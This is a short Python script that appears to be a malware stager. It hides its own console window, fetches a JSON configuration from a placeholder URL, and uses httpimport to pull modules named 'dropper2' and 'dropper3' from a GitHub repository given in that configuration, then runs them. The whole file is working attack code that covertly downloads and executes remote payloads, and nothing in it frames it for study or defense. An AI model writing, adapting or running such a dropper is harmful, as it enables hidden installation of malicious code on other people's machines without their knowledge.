import httpimport, requests, json, sys
import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
config_url = "CONFIG_URL"
config_text = requests.get(config_url).text
config = json.loads(config_text)
with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"], module="dropper3"):
    with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"], module="dropper2"):
        import dropper2
        dropper2.run()